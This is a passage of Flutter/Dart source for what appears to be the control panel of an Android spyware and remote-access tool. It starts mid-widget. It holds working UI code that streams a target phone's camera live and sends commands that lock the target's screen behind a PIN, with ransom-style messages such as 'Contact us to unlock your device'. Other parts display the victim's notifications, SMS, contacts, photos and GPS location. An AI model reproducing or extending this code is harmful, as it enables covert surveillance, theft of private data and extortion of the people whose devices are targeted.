              color: const Color(0xFF020210),
              child: _frame != null
                  ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
                  : SizedBox(height: 200, child: Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                      SizedBox(
                        width: 30,
                        height: 30,
                        child: CircularProgressIndicator(strokeWidth: 2, color: theme.primaryColor),
                      ),
                      const SizedBox(height: 12),
                      Text('Waiting for frames...', style: TextStyle(color: theme.textSecondaryColor, fontSize: 12)),
                    ]))),
            ),
            Container(
              padding: const EdgeInsets.all(14),
              decoration: BoxDecoration(
                color: theme.glassPrimary,
                borderRadius: const BorderRadius.vertical(bottom: Radius.circular(18)),
              ),
              child: Row(children: [
                Expanded(
                  child: OutlinedButton.icon(
                    style: OutlinedButton.styleFrom(
                      side: BorderSide(color: theme.primaryColor),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                    ),
                    icon: Icon(Icons.cameraswitch_rounded, color: theme.primaryColor, size: 18),
                    label: Text('SWITCH', style: TextStyle(color: theme.primaryColor, fontSize: 11, fontWeight: FontWeight.w600)),
                    onPressed: () {
                      final isFront = _liveTitle.contains('FRONT');
                      _stopLive();
                      Future.delayed(const Duration(milliseconds: 300), () => _startLive('live_camera_start', isFront ? 'back' : 'front'));
                    },
                  ),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Container(
                    decoration: BoxDecoration(
                      gradient: LinearGradient(colors: [theme.accentColor, Colors.redAccent]),
                      borderRadius: BorderRadius.circular(12),
                      boxShadow: [BoxShadow(color: theme.accentColor.withOpacity(0.4), blurRadius: 10)],
                    ),
                    child: ElevatedButton.icon(
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.transparent,
                        shadowColor: Colors.transparent,
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                      ),
                      icon: const Icon(Icons.stop_rounded, color: Colors.white, size: 18),
                      label: const Text('STOP', style: TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold)),
                      onPressed: () { _stopLive(); Navigator.pop(ctx); },
                    ),
                  ),
                ),
              ]),
            ),
          ]),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _lockLiveDialog(ThemeProvider theme) {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: theme.glassPrimary,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: theme.accentColor.withOpacity(0.5))),
      title: Text('Lock Blanks screen', style: TextStyle(color: theme.accentColor, fontSize: 15, fontWeight: FontWeight.bold)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        Text(' target screen will black out freeze', style: TextStyle(color: theme.textSecondaryColor, fontSize: 12)),
        const SizedBox(height: 14),
        _field(theme, msgCtrl, 'Nothing', hint: 'This device is locked by administrator'),
        const SizedBox(height: 12),
        _field(theme, pinCtrl, 'SxC By @JustRxVz', hint: '1234', isNum: true),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: Text('Cancel', style: TextStyle(color: theme.textSecondaryColor))),
        Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [theme.accentColor, const Color(0xFFB71C1C)]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () {
              Navigator.pop(context);
              final msg = msgCtrl.text.trim().isEmpty ? 'THIS DEVICE IS LOCKED BY ADMINISTRATOR' : msgCtrl.text.trim();
              final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
              _cmd('lock_live', extra: '$msg|$pin');
            },
            child: const Text('LAUNCH BLANKS', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ),
      ],
    ));
  }

  void _lockChatDialog(ThemeProvider theme) {
    final msgCtrl  = TextEditingController();
    final pinCtrl  = TextEditingController();
    final chatCtrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: theme.glassPrimary,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: theme.primaryColor.withOpacity(0.5))),
      title: Text('Blanks Screen', style: TextStyle(color: theme.primaryColor, fontSize: 15, fontWeight: FontWeight.bold)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        _field(theme, msgCtrl, 'Me or You?', hint: 'Example: Device locked by administrator'),
        const SizedBox(height: 12),
        _field(theme, pinCtrl, 'Nothing', hint: '1234', isNum: true),
        const SizedBox(height: 12),
        _field(theme, chatCtrl, 'This is Sxc apps', hint: 'Contact us to unlock your device'),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: Text('Cancel', style: TextStyle(color: theme.textSecondaryColor))),
        Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [theme.primaryColor, const Color(0xFF01579B)]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () {
              Navigator.pop(context);
              final msg = msgCtrl.text.trim().isEmpty ? 'THIS DEVICE IS LOCKED BY ADMINISTRATOR' : msgCtrl.text.trim();
              final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
              _cmd('hard_lock', extra: '$msg|$pin');
              if (chatCtrl.text.trim().isNotEmpty) {
                Future.delayed(const Duration(milliseconds: 500), () => _sendChat(chatCtrl.text.trim()));
              }
            },
            child: const Text('LAUNCH NOW', style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)),
          ),
        ),
      ],
    ));
  }

  void _showCamPicker(Function(String) onPick) {
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    String sel = 'back';
    showDialog(context: context, builder: (_) => StatefulBuilder(
      builder: (ctx, ss) => AlertDialog(
        backgroundColor: theme.glassPrimary,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: theme.primaryColor.withOpacity(0.2))),
        title: Text('Select Camera', style: TextStyle(color: theme.textPrimaryColor, fontSize: 14, fontWeight: FontWeight.bold)),
        content: Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: ['back','front'].map((v) {
          final isSel = sel == v;
          final color = v == 'back' ? theme.accentColor : theme.primaryColor;
          return GestureDetector(
            onTap: () => ss(() => sel = v),
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 16),
              decoration: BoxDecoration(
                color: isSel ? color.withOpacity(0.1) : Colors.transparent,
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: isSel ? color : theme.primaryColor.withOpacity(0.2), width: isSel ? 2 : 1),
              ),
              child: Column(children: [
                Icon(v == 'back' ? Icons.camera_rear_rounded : Icons.camera_front_rounded, color: isSel ? color : theme.textSecondaryColor, size: 32),
                const SizedBox(height: 8),
                Text(v == 'back' ? 'Back' : 'Front', style: TextStyle(color: isSel ? color : theme.textSecondaryColor, fontSize: 12, fontWeight: FontWeight.w600)),
              ]),
            ),
          );
        }).toList()),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx), child: Text('Cancel', style: TextStyle(color: theme.textSecondaryColor))),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [theme.accentColor, const Color(0xFFB71C1C)]),
              borderRadius: BorderRadius.circular(12),
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
              onPressed: () { Navigator.pop(ctx); onPick(sel); },
              child: const Text('SELECT', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
            ),
          ),
        ],
      ),
    ));
  }

  void _inputDialog(String title, String label, Function(String) onDone, {bool isNumber = false, String hint = ''}) {
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    final ctrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: theme.glassPrimary,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: theme.primaryColor.withOpacity(0.2))),
      title: Text(title, style: TextStyle(color: theme.textPrimaryColor, fontSize: 14, fontWeight: FontWeight.bold)),
      content: _field(theme, ctrl, label, hint: hint, isNum: isNumber),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: Text('Cancel', style: TextStyle(color: theme.textSecondaryColor))),
        Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [theme.primaryColor, const Color(0xFF01579B)]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () { Navigator.pop(context); onDone(ctrl.text.trim()); },
            child: const Text('SEND', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ),
      ],
    ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // DATA DISPLAY
  // ─────────────────────────────────────────────────────────────────────────
  void _fetchNotif(ThemeProvider theme) async {
    _addLog('Fetching notifications...');
    try {
      final res = await http.get(Uri.parse('${ConfigService.baseUrl}/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        showModalBottomSheet(
          context: context,
          backgroundColor: theme.glassPrimary,
          isScrollControlled: true,
          shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(24))),
          builder: (_) => DraggableScrollableSheet(
            initialChildSize: 0.6,
            maxChildSize: 0.9,
            expand: false,
            builder: (_, sc) => Column(
              children: [
                Container(
                  height: 4,
                  width: 40,
                  margin: const EdgeInsets.only(top: 14, bottom: 10),
                  decoration: BoxDecoration(color: const Color(0xFFD946EF), borderRadius: BorderRadius.circular(4)),
                ),
                Text('NOTIFICATIONS', style: TextStyle(color: theme.textPrimaryColor, fontWeight: FontWeight.bold, fontSize: 14, letterSpacing: 1)),
                const SizedBox(height: 8),
                Expanded(
                  child: ListView.separated(
                    controller: sc,
                    padding: const EdgeInsets.symmetric(horizontal: 14),
                    itemCount: list.length,
                    separatorBuilder: (_, __) => Divider(color: theme.primaryColor.withOpacity(0.2), height: 1),
                    itemBuilder: (_, i) => ListTile(
                      contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                      leading: Container(
                        width: 42,
                        height: 42,
                        decoration: BoxDecoration(
                          color: const Color(0xFFD946EF).withOpacity(0.1),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(color: const Color(0xFFD946EF).withOpacity(0.3)),
                        ),
                        child: const Icon(Icons.notifications_rounded, color: Color(0xFFD946EF), size: 20),
                      ),
                      title: Text(
                        list[i]['title']?.toString() ?? '-',
                        style: TextStyle(color: theme.textPrimaryColor, fontSize: 13, fontWeight: FontWeight.w600),
                      ),
                      subtitle: Text(
                        list[i]['body']?.toString() ?? '',
                        style: TextStyle(color: theme.textSecondaryColor, fontSize: 11),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      }
    } catch (_) {
      _addLog('Notif error');
    }
  }

  void _imgDialog(String b64, String title) {
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(context: context, builder: (_) => Dialog(
        backgroundColor: theme.backgroundColor,
        insetPadding: const EdgeInsets.all(12),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: theme.primaryColor.withOpacity(0.5), width: 1.5),
        ),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Padding(padding: const EdgeInsets.all(16),
            child: Text(title, style: TextStyle(color: theme.textPrimaryColor, fontWeight: FontWeight.bold, fontSize: 14))),
          ClipRRect(
            borderRadius: const BorderRadius.vertical(bottom: Radius.circular(18)),
            child: Image.memory(bytes, fit: BoxFit.contain),
          ),
        ]),
      ));
    } catch (_) { _toast('Image decode failed'); }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: theme.glassPrimary,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: Colors.green.withOpacity(0.5))),
      title: Text('GPS Location', style: TextStyle(color: theme.textPrimaryColor, fontSize: 14, fontWeight: FontWeight.bold)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        Text('Latitude:  $lat', style: const TextStyle(color: Colors.green, fontFamily: 'monospace', fontSize: 13)),
        const SizedBox(height: 6),
        Text('Longitude: $lng', style: const TextStyle(color: Colors.green, fontFamily: 'monospace', fontSize: 13)),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: Text('Close', style: TextStyle(color: theme.textSecondaryColor))),
        Container(
          decoration: BoxDecoration(
            gradient: const LinearGradient(colors: [Colors.green, Color(0xFF1B5E20)]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () => launchUrl(Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'), mode: LaunchMode.externalApplication),
            child: const Text('OPEN MAPS', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ),
      ],
    ));
  }

  void _textDialog(String title, String content) {
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: theme.glassPrimary,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: theme.primaryColor.withOpacity(0.2))),
      title: Text(title, style: TextStyle(color: theme.textPrimaryColor, fontSize: 14, fontWeight: FontWeight.bold)),
      content: Container(
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: theme.backgroundColor,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: theme.primaryColor.withOpacity(0.2)),
        ),
        child: SelectableText(content, style: TextStyle(color: theme.primaryColor, fontFamily: 'monospace', fontSize: 12)),
      ),
      actions: [TextButton(onPressed: () => Navigator.pop(context), child: Text('Close', style: TextStyle(color: theme.textSecondaryColor)))],
    ));
  }

  void _contactsSheet(List contacts) {
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    showModalBottomSheet(context: context, backgroundColor: theme.glassPrimary,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(24))),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 14, bottom: 10),
              decoration: BoxDecoration(color: theme.accentColor, borderRadius: BorderRadius.circular(4))),
            Text('CONTACTS (${contacts.length})', style: TextStyle(color: theme.textPrimaryColor, fontWeight: FontWeight.bold, fontSize: 14, letterSpacing: 1)),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: contacts.length,
                separatorBuilder: (_, __) => Divider(color: theme.primaryColor.withOpacity(0.2), height: 1),
                itemBuilder: (_, i) => ListTile(
                  contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                  leading: Container(
                    width: 42, height: 42,
                    decoration: BoxDecoration(
                      color: theme.accentColor.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: theme.accentColor.withOpacity(0.3)),
                    ),
                    child: Icon(Icons.person_rounded, color: theme.accentColor, size: 20),
                  ),
                  title: Text(contacts[i]['name']?.toString() ?? '-', style: TextStyle(color: theme.textPrimaryColor, fontSize: 13, fontWeight: FontWeight.w600)),
                  subtitle: Text(contacts[i]['number']?.toString() ?? '-', style: TextStyle(color: theme.textSecondaryColor, fontSize: 11)),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _smsSheet(List sms) {
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    showModalBottomSheet(context: context, backgroundColor: theme.glassPrimary,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(24))),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.7,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 14, bottom: 10),
              decoration: BoxDecoration(color: const Color(0xFF00E5FF), borderRadius: BorderRadius.circular(4))),
            Text('SMS (${sms.length})', style: TextStyle(color: theme.textPrimaryColor, fontWeight: FontWeight.bold, fontSize: 14, letterSpacing: 1)),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: sms.length,
                separatorBuilder: (_, __) => Divider(color: theme.primaryColor.withOpacity(0.2), height: 1),
                itemBuilder: (_, i) {
                  final s = sms[i] as Map;
                  return ListTile(
                    contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                    leading: Container(
                      width: 42, height: 42,
                      decoration: BoxDecoration(
                        color: const Color(0xFF00E5FF).withOpacity(0.1),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: const Color(0xFF00E5FF).withOpacity(0.3)),
                      ),
                      child: const Icon(Icons.sms_rounded, color: Color(0xFF00E5FF), size: 20),
                    ),
                    title: Text(s['address']?.toString() ?? '-', style: TextStyle(color: theme.textPrimaryColor, fontSize: 13, fontWeight: FontWeight.w600)),
                    subtitle: Text(s['body']?.toString() ?? '', style: TextStyle(color: theme.textSecondaryColor, fontSize: 11), maxLines: 2, overflow: TextOverflow.ellipsis),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _gallerySheet(List imgs) {
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    showModalBottomSheet(context: context, backgroundColor: theme.glassPrimary,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(24))),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.75,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 14, bottom: 10),
              decoration: BoxDecoration(color: const Color(0xFFD946EF), borderRadius: BorderRadius.circular(4))),
            Text('GALLERY (${imgs.length})', style: TextStyle(color: theme.textPrimaryColor, fontWeight: FontWeight.bold, fontSize: 14, letterSpacing: 1)),
            const SizedBox(height: 8),
            Expanded(
              child: imgs.isEmpty
                  ? Center(child: Text('No photos found', style: TextStyle(color: theme.textSecondaryColor)))
                  : GridView.builder(
                      controller: sc,
                      padding: const EdgeInsets.all(10),
                      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                        crossAxisCount: 3,
                        crossAxisSpacing: 8,
                        mainAxisSpacing: 8,
                      ),
                      itemCount: imgs.length,
                      itemBuilder: (_, i) {
                        try {
                          final raw = imgs[i].toString();
                          final clean = raw.contains(',') ? raw.split(',').last : raw;
                          final bytes = base64Decode(clean);
                          return GestureDetector(
                            onTap: () => _imgDialog(raw, 'Gallery Photo ${i+1}'),
                            child: ClipRRect(
                              borderRadius: BorderRadius.circular(12),
                              child: Image.memory(bytes, fit: BoxFit.cover),
                            ),
                          );
                        } catch (_) {
                          return Container(decoration: BoxDecoration(color: theme.backgroundColor, borderRadius: BorderRadius.circular(12)));
                        }
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }

  // ─────────────────────────────────────────────────────────────────────────
  // UI HELPERS (PREMIUM)
  // ─────────────────────────────────────────────────────────────────────────
  Widget get _gap => const SizedBox(height: 14);

  Widget _header(ThemeProvider theme, String title, String sub) => Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
    ShaderMask(
      shaderCallback: (bounds) => LinearGradient(colors: [theme.accentColor, theme.primaryColor]).createShader(bounds),
      child: Text(title, style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.w700, letterSpacing: 1)),
    ),
    const SizedBox(height: 6),
    Text(sub, style: TextStyle(color: theme.textSecondaryColor, fontSize: 11, letterSpacing: 0.3)),
    const SizedBox(height: 8),
    Container(
      height: 2,
      width: 60,
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [theme.accentColor, theme.primaryColor]),
        borderRadius: BorderRadius.circular(2),
      ),
    ),
  ]);

  // PREMIUM NEON SINGLE BUTTON
  Widget _neonSingleBtn(ThemeProvider theme, String label, IconData icon, Color color, VoidCallback fn, {bool isDestructive = false}) =>
    GestureDetector(
      onTap: fn,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        margin: const EdgeInsets.symmetric(vertical: 4),
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        decoration: BoxDecoration(
          color: theme.glassPrimary,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: color.withOpacity(0.4), width: 1.5),
          boxShadow: [
            BoxShadow(color: color.withOpacity(isDestructive ? 0.25 : 0.12), blurRadius: 16, spreadRadius: 1),
          ],
        ),
        child: Row(children: [
          Container(
            width: 46, height: 46,
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [color.withOpacity(0.2), color.withOpacity(0.05)], begin: Alignment.topLeft, end: Alignment.bottomRight),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: color.withOpacity(0.3), width: 1),
            ),
            child: Icon(icon, color: color, size: 22),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Text(label, style: TextStyle(color: theme.textPrimaryColor, fontSize: 13, fontWeight: FontWeight.w700, letterSpacing: 1.2)),
          ),
          Container(
            width: 34, height: 34,
            decoration: BoxDecoration(
              color: color.withOpacity(0.1),
              shape: BoxShape.circle,
              border: Border.all(color: color.withOpacity(0.3)),
            ),
            child: Icon(Icons.arrow_forward_rounded, color: color, size: 18),
          ),
        ]),
      ),
    );

  // PREMIUM NEON DUAL BUTTON
  Widget _neonDualBtn(ThemeProvider theme, {
    required String leftLabel, required IconData leftIcon, required Color leftColor, required VoidCallback leftFn,
    required String rightLabel, required IconData rightIcon, required Color rightColor, required VoidCallback rightFn,
  }) => Row(children: [
    Expanded(
      child: GestureDetector(
        onTap: leftFn,
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 16),
          decoration: BoxDecoration(
            color: theme.glassPrimary,
            borderRadius: const BorderRadius.only(topLeft: Radius.circular(16), bottomLeft: Radius.circular(16)),
            border: Border.all(color: leftColor.withOpacity(0.4), width: 1.5),
            boxShadow: [BoxShadow(color: leftColor.withOpacity(0.12), blurRadius: 14, spreadRadius: 1)],
          ),
          child: Column(children: [
            Container(
              width: 44, height: 44,
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [leftColor.withOpacity(0.2), leftColor.withOpacity(0.05)], begin: Alignment.topLeft, end: Alignment.bottomRight),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: leftColor.withOpacity(0.3)),
              ),
              child: Icon(leftIcon, color: leftColor, size: 22),
            ),
            const SizedBox(height: 12),
            Text(leftLabel, textAlign: TextAlign.center,
                style: TextStyle(color: leftColor, fontSize: 11, fontWeight: FontWeight.w800, letterSpacing: 1.2)),
          ]),
        ),
      ),
    ),
    Container(width: 2, height: 100, color: theme.primaryColor.withOpacity(0.2)),
    Expanded(
      child: GestureDetector(
        onTap: rightFn,
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 16),
          decoration: BoxDecoration(
            color: theme.glassPrimary,
            borderRadius: const BorderRadius.only(topRight: Radius.circular(16), bottomRight: Radius.circular(16)),
            border: Border.all(color: rightColor.withOpacity(0.4), width: 1.5),
            boxShadow: [BoxShadow(color: rightColor.withOpacity(0.12), blurRadius: 14, spreadRadius: 1)],
          ),
          child: Column(children: [
            Container(
              width: 44, height: 44,
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [rightColor.withOpacity(0.2), rightColor.withOpacity(0.05)], begin: Alignment.topLeft, end: Alignment.bottomRight),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: rightColor.withOpacity(0.3)),
              ),
              child: Icon(rightIcon, color: rightColor, size: 22),
            ),
            const SizedBox(height: 12),
            Text(rightLabel, textAlign: TextAlign.center,
                style: TextStyle(color: rightColor, fontSize: 11, fontWeight: FontWeight.w800, letterSpacing: 1.2)),
          ]),
        ),
      ),
    ),
  ]);

  Widget _infoRow(ThemeProvider theme, String num, String text, Color color) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 5),
    child: Row(children: [
      Container(
        width: 24, height: 24,
        decoration: BoxDecoration(
          color: color.withOpacity(0.15),
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: color.withOpacity(0.3)),
        ),
        child: Center(child: Text(num, style: TextStyle(color: color, fontSize: 11, fontWeight: FontWeight.bold))),
      ),
      const SizedBox(width: 14),
      Expanded(child: Text(text, style: TextStyle(color: theme.textSecondaryColor, fontSize: 11, height: 1.4))),
    ]),
  );

  Widget _field(ThemeProvider theme, TextEditingController ctrl, String label, {String hint = '', bool isNum = false}) =>
    TextField(
      controller: ctrl,
      keyboardType: isNum ? TextInputType.number : TextInputType.text,
      style: TextStyle(color: theme.textPrimaryColor, fontSize: 14),
      decoration: InputDecoration(
        labelText: label,
        hintText: hint,
        labelStyle: TextStyle(color: theme.textSecondaryColor, fontSize: 12, fontWeight: FontWeight.w500),
        hintStyle: TextStyle(color: theme.textSecondaryColor, fontSize: 12),
        filled: true,
        fillColor: theme.backgroundColor,
        contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide(color: theme.primaryColor.withOpacity(0.2))),
        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide(color: theme.primaryColor.withOpacity(0.2))),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(14),
          borderSide: BorderSide(color: theme.primaryColor, width: 2),
        ),
      ),
    );
}